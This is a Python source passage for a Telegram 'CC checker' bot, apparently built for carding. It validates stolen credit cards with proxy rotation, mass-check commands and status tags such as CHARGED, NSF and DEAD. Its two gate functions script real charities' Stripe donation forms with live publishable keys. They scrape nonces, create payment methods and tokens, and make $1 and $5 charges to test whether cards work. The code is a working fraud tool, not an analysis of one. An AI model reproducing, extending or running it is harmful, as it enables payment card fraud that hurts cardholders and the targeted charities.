    elif not proxy_db.get('is_rotating'):
        response += """

⚠️ Warning: This proxy is NOT rotating!
Non-rotating proxies may result in bad hits and CAPTCHAs."""

    await message.reply(response)

@dp.message(Command("testproxy"))
async def cmd_testproxy(message: Message):
    """Test current proxy health"""
    user = message.from_user
    db.get_or_create_user(user.id, user.username, user.first_name)

    proxy_url = await proxy_manager.get_proxy_url(user.id)

    if not proxy_url:
        await message.reply(f"""❌ No proxy set!

<b>Set a proxy:</b> <code>/setproxy ip:port</code>""")
        return

    msg = await message.reply("⏳ Testing proxy...")

    is_working = await proxy_manager.check_proxy_health(user.id, proxy_url)

    if is_working:
        await msg.edit_text(f"""✅ <b>Proxy is WORKING!</b>

Your proxy passed the health check.
Status has been updated.""")
    else:
        fail_count = db.get_user_proxy(user.id).get('fail_count', 0)
        if fail_count >= PROXY_MAX_FAILS:
            await msg.edit_text(f"""❌ <b>Proxy is DEAD!</b>

Failed {fail_count} times in a row.
Please set a new working proxy:
<code>/setproxy ip:port:user:pass</code>""")
        else:
            await msg.edit_text(f"""⚠️ <b>Proxy Test Failed!</b>

Fail count: {fail_count}/{PROXY_MAX_FAILS}
The proxy will be marked as dead after {PROXY_MAX_FAILS} failures.

Try again or set a new proxy:
<code>/setproxy ip:port:user:pass</code>""")

@dp.message(Command("clearproxy"))
async def cmd_clearproxy(message: Message):
    """Clear user's proxy"""
    user = message.from_user
    db.get_or_create_user(user.id, user.username, user.first_name)

    if await proxy_manager.clear_proxy(user.id):
        await message.reply(f"""{MINI_BANNER}

✅ <b>Proxy Cleared!</b>

Your checks will now require a new proxy.
Set a new proxy: <code>/setproxy ip:port</code>""")
    else:
        await message.reply(f"""{MINI_BANNER}

❌ No proxy was set.
Set a proxy: <code>/setproxy ip:port</code>""")

# Built-in commands that should not be handled by dynamic gateway handler

BUILTIN_COMMANDS = {
    'start', 'cmds', 'help', 'commands', 'bin', 'gen', 'me', 'profile', 'top', 'leaderboard',
    'last', 'history', 'stats', 'ban', 'unban', 'broadcast', 'genkey', 'genkeys',
    'redeem', 'keys', 'tier', 'premium', 'clean', 'extract', 'stop', 'tasks',
    'setproxy', 'proxy', 'clearproxy', 'testproxy', 'cancel', 'dupe', 'dedup', 'unique', 'filter', 'fbin', 'split', 'chunk',
    'fake', 'fakeinfo', 'live', 'hits', 'livehits', 'today', 'stats24', 'daily',
    'exp', 'expdate', 'byexp', 'multibin', 'mbin', 'genmulti',
    'str', 'mstr', 'mstrtxt',
    'str4', 'mstr4', 'mstr4txt',
    'str5', 'mstr5', 'mstr5txt',
    'str1', 'mstr1', 'mstr1txt',
    'str2', 'mstr2', 'mstr2txt',
    'autohit', 'mautohit', 'mautohittxt',
}

# Dynamic gateway commands - supports multiple prefixes (/, ., !, ")
@dp.message()
async def handle_dynamic_commands(message: Message):
    text = message.text.strip() if message.text else ""

    # Check for any supported prefix
    is_cmd, cmd, args = is_command_with_prefix(text)
    if not is_cmd:
        return

    # Skip built-in commands - let aiogram handlers process them
    if cmd in BUILTIN_COMMANDS:
        return

    # Check for mass gate commands: /m{gate} or /m{gate}txt
    is_mass = False
    is_mass_txt = False
    gate_cmd = cmd

    if cmd.startswith('m') and len(cmd) > 1:
        potential_gate = cmd[1:]  # remove 'm' prefix
        if potential_gate.endswith('txt'):
            # /m{gate}txt pattern
            potential_gate = potential_gate[:-3]
            if db.get_gateway_by_cmd(potential_gate):
                gate_cmd = potential_gate
                is_mass_txt = True
        elif db.get_gateway_by_cmd(potential_gate):
            gate_cmd = potential_gate
            is_mass = True

    # Check if it's a gateway command
    gateway = db.get_gateway_by_cmd(gate_cmd)
    if not gateway:
        return

    # Handle mass check for gate
    if is_mass:
        await handle_gate_mass_check(message, gate_cmd, gateway, args)
        return

    # Handle mass txt for gate
    if is_mass_txt:
        await handle_gate_mass_txt(message, gate_cmd, gateway)
        return

    site_url, prod_id, price, title, gate_type = gateway

    cached_variant_info = None

    user = message.from_user

    if db.is_banned(user.id):
        await message.reply("❌ You are banned")
        return

    # Try to get card from args, or from replied message
    card_data = None
    if args:
        card_data = parse_card(args)
        if not card_data:
            # Try extracting from args text
            extracted = extract_cards_from_text(args)
            if extracted:
                card_data = extracted[0]

    # If no card in args, try replied message
    if not card_data and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        extracted = extract_cards_from_text(reply_text)
        if extracted:
            card_data = extracted[0]
        elif reply_text:
            card_data = parse_card(reply_text.strip())

    if not card_data:
        await message.reply(f"""<b>Usage:</b>
• <code>/{cmd} CC|MM|YY|CVV</code>
• <code>.{cmd} CC|MM|YY|CVV</code>
• <code>!{cmd} CC|MM|YY|CVV</code>
• Reply to a message containing CC with <code>/{cmd}</code>""")
        return

    can, reason = can_check(user.id)
    if not can:
        await message.reply(f"⏳ {reason}")
        return

    if not luhn_check(card_data['number']):
        await message.reply("❌ Invalid card (Luhn failed)")
        return

    record_check(user.id)
    db.get_or_create_user(user.id, user.username, user.first_name)

    user_proxy = await proxy_manager.get_proxy_url(user.id)
    if gate_type in ["stripe_checkout", "stripe_secondstork"]:
        # STRIPE UHQ gates are optional proxy (recommended for better success)
        pass

    card_display = format_card_display(card_data['number'], card_data['month'], card_data['year'], card_data['cvv'])
    proxy_status = "🔒 Proxy" if user_proxy else "🌐 No Proxy"
    msg = await message.reply(f"⏳ <b>Checking...</b>\n\n<b>Card:</b> <code>{card_display}</code>\n<b>Gate:</b> /{cmd}\n<b>Connection:</b> {proxy_status}")

    bin_info = await lookup_bin(card_data['number'])

    # Route to appropriate checker based on gate_type
    if gate_type in ["stripe_checkout", "stripe_secondstork"]:
        result = await check_card_stripe_checkout_session(card_data, user_proxy)

    status = result.get('status', 'UNKNOWN')
    is_chargeable = result.get('is_chargeable')
    result_msg = result.get('message', '')

    # Check if this is a gateway error (not a card issue)
    gateway_err = is_gateway_error(status, result_msg)
    # Check if response is valid (DECLINED, APPROVED/CCN, CHARGED, 3DS)
    is_valid = is_valid_gateway_response(status, result_msg, result)
    emoji = get_status_emoji(status, is_chargeable)

    # Determine status tag based on actual status - check 3DS BEFORE CHARGED
    if not is_valid:
        status_tag = "GATEWAY NOT SUITABLE"
        is_live = False
    elif gateway_err:
        status_tag = "SITE ERROR"
        is_live = False
    elif status.startswith('Approved'):
        status_tag = status  # Keep "Approved ⇾ CCN" etc as-is
        is_live = True
    elif status == '2FACTOR' or status == '3DS' or status == '3DS_REQUIRED' or '3D' in status.upper():
        status_tag = "Approved ⇾ 3DS"
        is_live = True
    elif result.get('success') or status == 'CHARGED':
        status_tag = "CHARGED"
        is_live = True
    elif is_chargeable is True:
        status_tag = f"Approved ⇾ {status}"
        is_live = True
    elif is_chargeable is False:
        status_tag = "DEAD"
        is_live = False
    else:
        status_tag = status
        is_live = False

    # Update stats only if not a gateway error and response is valid
    if not gateway_err and is_valid:
        db.update_user_stats(user.id, is_live)
        db.update_gateway_stats(gate_cmd, is_live)
    db.add_check_history(user.id, card_data['number'][:6], card_data['number'][-4:], gate_cmd, status, result_msg, result.get('time', 0))

    tier = db.get_user_tier(user.id, user.username)
    tier_display = tier.capitalize()

    # Format status line - emoji at end, arrow format for Approved
    if status_tag.startswith('Approved'):
        # "Approved ⇾ CCN" -> "Approved -» CCN ✅"
        status_line = f"{status_tag.replace('⇾', '-»')} {emoji}"
    elif not is_valid:
        status_line = f"{status_tag} ⚠️"
    elif gateway_err:
        status_line = f"{status_tag} ⚠️ (Site broken, try another)"
    else:
        status_line = f"{status_tag} {emoji}"

    response = f"""<b>PROO CHK</b> ⚡
- - - - - - - - - - - - - - - - - - - - - -
[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Card</b> ⇝ <code>{card_display}</code>
[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Status</b> ⇝ {status_line}
[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Result</b> ⇝ {result_msg or 'N/A'}

[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Bin</b> ⇝ {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Bank</b> ⇝ {bin_info['bank'][:30]}
[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Country</b> ⇝ {bin_info['emoji']} {bin_info['country']}

[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Site</b> ⇝ /{gate_cmd} (${price})
[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Time</b> ⇝ {format_time(result.get('time', 0))}
[<a href="tg://resolve?domain={BOT_USERNAME}">=</a>] <b>Used By</b> ⇝ @{user.username or user.first_name} [{tier_display}]
- - - - - - - - - - - - - - - - - - - - - -"""

    await msg.edit_text(response, disable_web_page_preview=True)

# ═══════════════════════════════════════════════════════════════
#                         MAIN
# ═══════════════════════════════════════════════════════════════

async def health_check(request):
    return web.Response(text="OK")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8080)
    await site.start()
    print(f"[WEB] Health server running on port 8080")

async def notify_dead_proxies():
    """Background task to notify users about dead proxies"""
    while True:
        try:
            await asyncio.sleep(60)  # Check every minute
            notifications = await proxy_manager.get_pending_notifications()
            for user_id, reason in notifications.items():
                try:
                    await bot.send_message(user_id, f"""🚨 <b>PROXY DEAD!</b>

Your proxy has failed multiple health checks.
Reason: {reason}

Please set a new working proxy to continue:
<code>/setproxy ip:port:user:pass</code>

Check status: /proxy""")
                except Exception as e:
                    print(f"[NOTIFY] Failed to notify user {user_id}: {e}")
        except Exception as e:
            print(f"[NOTIFY] Error in notification loop: {e}")
            await asyncio.sleep(60)

async def main():
    print(f"[BOT] PROO CC CHECKER")
    print(f"[BOT] @{BOT_USERNAME}")
    print(f"[OWNER] @{OWNER_USERNAME}")
    print(f"[STATUS] Starting...")

    await start_web_server()

    # Start proxy health check loop
    proxy_manager.start_health_check_loop()
    print(f"[PROXY] Health check loop started (interval: {PROXY_CHECK_INTERVAL} min)")

    # Start notification task
    asyncio.create_task(notify_dead_proxies())
    print(f"[NOTIFY] Dead proxy notification task started")

    try:
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        print("\n[STATUS] Shutting down...")
        await bot.session.close()

# ═══════════════════════════════════════════════════════════════
# WORKING STRIPE UHQ IMPLEMENTATIONS
# ═══════════════════════════════════════════════════════════════



async def check_card_stripe_checkout_session(card_data, proxy_url=None, debug=False):
    """Stripe $1 Charge gate - /str1
    Flow: admin-ajax → GET session → orderID → create-price → create-checkout-session → PM → confirm
    """
    start = time.time()

    def log_debug(msg):
        if debug:
            print(f"[STR1] {msg}")

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=90)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Step 1: POST admin-ajax → get session URL
            log_debug("Getting session...")
            async with session.post(
                "https://www.alayninternational.org/wp-admin/admin-ajax.php",
                data="cause=SAD&country_dropdown=Any&currency=USD&amount=1&fname=PROO&sname=REAL&email=becaso6239@bialode.com&country=GB&action=sagepayformBilling",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                proxy=proxy_url,
                ssl=False
            ) as resp:
                text = await resp.text()
                if 'href = "' not in text:
                    return {'success': False, 'status': 'ERROR', 'message': 'NO_SESSION', 'is_chargeable': None, 'time': time.time() - start}
                session_path = text.split('href = "')[1].split('"')[0]
                log_debug(f"Session: {session_path}")

            # Step 2: GET session page → capture orderID
            log_debug("Getting orderID...")
            async with session.get(
                f"https://www.alayninternational.org{session_path}",
                proxy=proxy_url,
                ssl=False
            ) as resp:
                page = await resp.text()
                if "orderID: '" not in page:
                    return {'success': False, 'status': 'ERROR', 'message': 'NO_ORDER_ID', 'is_chargeable': None, 'time': time.time() - start}
                order_id = page.split("orderID: '")[1].split("'")[0]
                log_debug(f"OrderID: {order_id}")

            # Step 3: Create $1 price
            log_debug("Creating price...")
            async with session.post(
                "https://www.alayninternational.org/wp-content/plugins/alayn-payment-form-stripe-checkout/form/ecommerce/create-price.php",
                json={"productID":"SAD","productName":"Sadaqa","amount":1,"description":"","ProductImage":"","currency":"usd"},
                proxy=proxy_url,
                ssl=False
            ) as resp:
                price_data = await resp.json()
                price_id = price_data.get('priceId')
                if not price_id:
                    return {'success': False, 'status': 'ERROR', 'message': 'NO_PRICE', 'is_chargeable': None, 'time': time.time() - start}
                log_debug(f"Price: {price_id}")

            # Step 4: Create checkout session
            log_debug("Creating checkout session...")
            cs_payload = {
                "lineItems":[{"price":price_id,"quantity":1}],
                "cartTotalAmount":1,
                "firstName":"H",
                "lastName":"REAL",
                "email":"becaso6239@bialode.com",
                "orderID":order_id,
                "phone":"",
                "notes":"",
                "crmCode":"SAD",
                "causeName":"Sadaqa",
                "dropdDownValue":"Any",
                "successUrl":"https://www.alayninternational.org/donate/confirm-payment/",
                "cancelUrl":"https://www.alayninternational.org/donate/confirm-payment/"
            }
            
            async with session.post(
                "https://www.alayninternational.org/wp-content/plugins/alayn-payment-form-stripe-checkout/form/ecommerce/create-checkout-session.php",
                json=cs_payload,
                headers={
                    "Content-Type": "application/json",
                    "Origin": "https://www.alayninternational.org",
                    "Referer": f"https://www.alayninternational.org{session_path}"
                },
                proxy=proxy_url,
                ssl=False
            ) as resp:
                cs_data = await resp.json()
                client_secret = cs_data.get('clientSecret', '')
                if '_secret_' not in client_secret:
                    return {'success': False, 'status': 'ERROR', 'message': 'NO_CS', 'is_chargeable': None, 'time': time.time() - start}
                cs_id = client_secret.split('_secret_')[0]
                log_debug(f"CS: {cs_id}")

            # Step 5: Create payment method
            log_debug("Creating PM...")
            pm_payload = (
                f"type=card"
                f"&card[number]={card_data['number']}"
                f"&card[cvc]={card_data['cvv']}"
                f"&card[exp_month]={card_data['month']:02d}"
                f"&card[exp_year]={str(card_data['year'])[-2:]}"
                f"&billing_details[name]=H"
                f"&billing_details[email]=becaso6239%40bialode.com"
                f"&billing_details[address][country]=PK"
                f"&key=pk_live_51LI8bMG9sKJ1oFCajC3XXk0SU6AhSK3igHVfKi7oHLK7u7DlMzwhP7uFGW0CQR0Fzbu5US1bOZ9F1LOhGaQ9goES00athPxu0Y"
                f"&payment_user_agent=stripe.js%2Feeaff566a9%3B+stripe-js-v3%2Feeaff566a9%3B+checkout"
                f"&client_attribution_metadata[client_session_id]=4f4df5df-0d3d-488c-9801-89762e1ae6cf"
                f"&client_attribution_metadata[merchant_integration_source]=checkout"
                f"&client_attribution_metadata[merchant_integration_version]=embedded_checkout"
                f"&client_attribution_metadata[payment_method_selection_flow]=automatic"
            )

            stripe_headers = {
                "Host": "api.stripe.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
                "Accept": "application/json",
                "Referer": "https://js.stripe.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com"
            }

            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=pm_payload,
                headers=stripe_headers,
                proxy=proxy_url,
                ssl=False
            ) as resp:
                pm_data = await resp.json()
                pm_id = pm_data.get('id')
                if not pm_id:
                    err = pm_data.get('error', {}).get('message', 'NO_PM')
                    return {'success': False, 'status': 'DECLINED', 'message': err, 'is_chargeable': False, 'time': time.time() - start}
                log_debug(f"PM: {pm_id}")

            # Step 6: Confirm
            log_debug("Confirming...")
            confirm_payload = (
                f"eid=NA"
                f"&payment_method={pm_id}"
                f"&expected_amount=100"
                f"&expected_payment_method_type=card"
                f"&key=pk_live_51LI8bMG9sKJ1oFCajC3XXk0SU6AhSK3igHVfKi7oHLK7u7DlMzwhP7uFGW0CQR0Fzbu5US1bOZ9F1LOhGaQ9goES00athPxu0Y"
            )

            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{cs_id}/confirm",
                data=confirm_payload,
                headers=stripe_headers,
                proxy=proxy_url,
                ssl=False
            ) as resp:
                result = await resp.json()

                if 'error' in result:
                    err = result['error']
                    decline_code = err.get('decline_code', '')
                    error_code = err.get('code', '')
                    message = err.get('message', 'DECLINED')

                    if decline_code == 'insufficient_funds':
                        return {'success': True, 'status': 'Approved > NSF', 'message': 'INSUFFICIENT_FUNDS', 'is_chargeable': True, 'time': time.time() - start}
                    
                    if decline_code == 'authentication_required' or error_code == 'authentication_required':  # 3DS = DEAD
                        return {'success': True, 'status': '3DS', 'message': '3DS_REQUIRED', 'is_chargeable': True, 'time': time.time() - start}

                    if decline_code:
                        return {'success': False, 'status': 'DECLINED', 'message': f'DECLINED > {decline_code.upper()}', 'is_chargeable': False, 'time': time.time() - start}
                    
                    return {'success': False, 'status': 'DECLINED', 'message': message, 'is_chargeable': False, 'time': time.time() - start}

                # Check payment_intent status (nested in response)
                pi = result.get('payment_intent', {})
                pi_status = pi.get('status', '') if isinstance(pi, dict) else ''
                
                # Also check root status
                root_status = result.get('status', '')
                
                if pi_status == 'succeeded' or root_status == 'complete':
                    return {'success': True, 'status': 'CHARGED', 'message': 'CHARGED $1', 'is_chargeable': True, 'time': time.time() - start}

                if pi_status == 'requires_action':  # 3DS = DEAD
                    return {'success': True, 'status': '3DS', 'message': '3DS_REQUIRED', 'is_chargeable': True, 'time': time.time() - start}

                if pi_status == 'requires_payment_method':
                    last_err = pi.get('last_payment_error', {})
                    if last_err:
                        dc = last_err.get('decline_code', '')
                        msg = last_err.get('message', 'DECLINED')
                        if dc == 'insufficient_funds':
                            return {'success': True, 'status': 'Approved > NSF', 'message': 'INSUFFICIENT_FUNDS', 'is_chargeable': True, 'time': time.time() - start}
                        if dc:
                            return {'success': False, 'status': 'DECLINED', 'message': f'DECLINED > {dc.upper()}', 'is_chargeable': False, 'time': time.time() - start}
                        return {'success': False, 'status': 'DECLINED', 'message': msg, 'is_chargeable': False, 'time': time.time() - start}

                return {'success': False, 'status': 'UNKNOWN', 'message': f'PI:{pi_status}', 'is_chargeable': None, 'time': time.time() - start}

    except asyncio.TimeoutError:
        return {'success': False, 'status': 'ERROR', 'message': 'TIMEOUT', 'is_chargeable': None, 'time': time.time() - start}
    except Exception as e:
        return {'success': False, 'status': 'ERROR', 'message': str(e)[:50], 'is_chargeable': None, 'time': time.time() - start}


async def check_card_stripe_secondstork(card_data, proxy_url=None, debug=False):
    """Stripe $5 Charge gate - /str2 (Second Stork - Formidable Forms)
    Flow: GET page → token → PM → admin-ajax
    """
    start = time.time()

    def log_debug(msg):
        if debug:
            print(f"[STR2] {msg}")

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=90)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Step 1: GET page and parse nonces
            log_debug("Getting page...")
            async with session.get(
                "https://secondstork.org/donations/donation-form/",
                proxy=proxy_url,
                ssl=False
            ) as resp:
                page = await resp.text()
                if 'frm_submit_entry_34' not in page:
                    return {'success': False, 'status': 'ERROR', 'message': 'NO_FORM', 'is_chargeable': None, 'time': time.time() - start}
                
                # Parse nonces
                frm_nonce = page.split('frm_submit_entry_34" value="')[1].split('"')[0] if 'frm_submit_entry_34" value="' in page else ''
                action_nonce = page.split('"nonce":"')[1].split('"')[0] if '"nonce":"' in page else ''
                
                if not frm_nonce or not action_nonce:
                    return {'success': False, 'status': 'ERROR', 'message': 'NO_NONCE', 'is_chargeable': None, 'time': time.time() - start}
                log_debug(f"Nonces: {frm_nonce[:8]}... / {action_nonce[:8]}...")

            # Step 2: Create token
            log_debug("Creating token...")
            tok_payload = (
                f"card[number]={card_data['number']}"
                f"&card[cvc]={card_data['cvv']}"
                f"&card[exp_month]={card_data['month']:02d}"
                f"&card[exp_year]={str(card_data['year'])[-2:]}"
                f"&card[name]=H"
                f"&card[address_line1]=ST+26"
                f"&card[address_city]=NY"
                f"&card[address_zip]=10080"
                f"&key=pk_live_51I8ZwGAifsV2HHSa0jgLD6S16izScuihE2WtExBWzbyBsawOazS9cjt1aFyBsdSuK9nYwDD7Vh7LUOoa0Evb7Evb00yVEpTIJL"
                f"&_stripe_account=acct_1QKSXbCpkitTuUwe"
            )

            stripe_headers = {
                "Accept": "application/json",
                "Referer": "https://js.stripe.com/",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com"
            }

            async with session.post(
                "https://api.stripe.com/v1/tokens",
                data=tok_payload,
                headers=stripe_headers,
                proxy=proxy_url,
                ssl=False
            ) as resp:
                tok_data = await resp.json()
                token_id = tok_data.get('id')
                brand = tok_data.get('card', {}).get('brand', 'Unknown')
                if not token_id:
                    err = tok_data.get('error', {}).get('message', 'NO_TOKEN')
                    return {'success': False, 'status': 'DECLINED', 'message': err, 'is_chargeable': False, 'time': time.time() - start}
                log_debug(f"Token: {token_id} ({brand})")

            # Step 3: Create payment method
            log_debug("Creating PM...")
            pm_payload = (
                f"type=card"
                f"&billing_details[address][line1]=ST+26"
                f"&billing_details[address][city]=NY"
                f"&billing_details[address][postal_code]=10080"
                f"&billing_details[name]=H"
                f"&card[number]={card_data['number']}"
                f"&card[cvc]={card_data['cvv']}"
                f"&card[exp_month]={card_data['month']:02d}"
                f"&card[exp_year]={str(card_data['year'])[-2:]}"
                f"&payment_user_agent=stripe.js%2Feeaff566a9%3B+stripe-js-v3%2Feeaff566a9%3B+card-element"
                f"&key=pk_live_51I8ZwGAifsV2HHSa0jgLD6S16izScuihE2WtExBWzbyBsawOazS9cjt1aFyBsdSuK9nYwDD7Vh7LUOoa0Evb7Evb00yVEpTIJL"
                f"&_stripe_account=acct_1QKSXbCpkitTuUwe"
            )

            async with session.post(
                "https://api.stripe.com/v1/payment_methods",
                data=pm_payload,
                headers=stripe_headers,
                proxy=proxy_url,
                ssl=False
            ) as resp:
                pm_data = await resp.json()
                pm_id = pm_data.get('id')
                if not pm_id:
                    err = pm_data.get('error', {}).get('message', 'NO_PM')
                    return {'success': False, 'status': 'DECLINED', 'message': err, 'is_chargeable': False, 'time': time.time() - start}
                log_debug(f"PM: {pm_id}")

            # Step 4: Submit form
            log_debug("Submitting...")
            import random
            unique_id = f"{random.randint(100000,999999):x}-{int(time.time()*1000):x}"
            
            form_payload = (
                f"frm_action=create"
                f"&form_id=34"
                f"&frm_hide_fields_34=%5B%22frm_field_636_container%22%5D"
                f"&form_key=donations_stripe"
                f"&frm_submit_entry_34={frm_nonce}"
                f"&_wp_http_referer=%2Fdonations%2Fdonation-form%2F"
                f"&item_meta%5B584%5D=GD"
                f"&item_meta%5B585%5D=6"
                f"&item_meta%5B586%5D=%24++Other"
                f"&item_meta%5Bother%5D%5B586%5D=5"
                f"&item_meta%5B590%5D=H"
                f"&item_meta%5B591%5D=REAL"
                f"&item_meta%5B592%5D=test%40test.com"
                f"&item_meta%5B593%5D%5Bline1%5D=ST+26"
                f"&item_meta%5B593%5D%5Bcity%5D=NY"
                f"&item_meta%5B593%5D%5Bstate%5D=NY"
                f"&item_meta%5B593%5D%5Bzip%5D=10080"
                f"&item_meta%5B648%5D=5"
                f"&item_meta%5B603%5D=stripe"
                f"&stripeToken={token_id}"
                f"&stripeBrand={brand}"
                f"&stripeMethod={pm_id}"
                f"&unique_id={unique_id}"
                f"&action=frm_entries_create"
                f"&nonce={action_nonce}"
            )

            async with session.post(
                "https://secondstork.org/wp-admin/admin-ajax.php",
                data=form_payload,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "X-Requested-With": "XMLHttpRequest",
                    "Origin": "https://secondstork.org"
                },
                proxy=proxy_url,
                ssl=False
            ) as resp:
                result_text = await resp.text()
                
                try:
                    result = json.loads(result_text)
                except:
                    return {'success': False, 'status': 'ERROR', 'message': 'BAD_JSON', 'is_chargeable': None, 'time': time.time() - start}

                content = result.get('content', '')
                is_pass = result.get('pass', False)

                # Check for success
                if is_pass or 'thank you' in content.lower():
                    return {'success': True, 'status': 'CHARGED', 'message': 'CHARGED $5', 'is_chargeable': True, 'time': time.time() - start}

                # Check for decline
                if 'declined' in content.lower():
                    return {'success': False, 'status': 'DECLINED', 'message': 'Your card was declined.', 'is_chargeable': False, 'time': time.time() - start}

                # Check for authentication/3DS
                if 'authentication' in content.lower() or '3ds' in content.lower():
                    return {'success': True, 'status': '3DS', 'message': '3DS_REQUIRED', 'is_chargeable': True, 'time': time.time() - start}

                # Check for specific error messages
                if 'frm_error_style' in content:
                    import re
                    match = re.search(r'frm_error_style">([^<]+)', content)
                    if match:
                        return {'success': False, 'status': 'DECLINED', 'message': match.group(1), 'is_chargeable': False, 'time': time.time() - start}

                return {'success': False, 'status': 'UNKNOWN', 'message': 'UNKNOWN_RESPONSE', 'is_chargeable': None, 'time': time.time() - start}

    except asyncio.TimeoutError:
        return {'success': False, 'status': 'ERROR', 'message': 'TIMEOUT', 'is_chargeable': None, 'time': time.time() - start}
    except Exception as e:
        return {'success': False, 'status': 'ERROR', 'message': str(e)[:50], 'is_chargeable': None, 'time': time.time() - start}


if __name__ == "__main__":
    asyncio.run(main())
